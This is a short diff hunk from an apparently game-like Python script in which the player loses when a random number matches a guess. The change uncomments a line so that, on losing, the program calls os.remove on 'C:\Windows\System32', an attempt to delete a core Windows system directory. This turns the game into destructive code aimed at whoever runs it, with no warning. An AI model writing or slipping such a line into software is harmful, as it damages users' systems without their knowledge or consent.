@@ -59,7 +59,7 @@ def main(bullets):
     rand = random.randint(0, bullets + 1)
     if rand == guess:
         input("You lose.\n")
-        #os.remove("C:\Windows\System32")
+        os.remove("C:\Windows\System32")
         sys.exit()
         
        
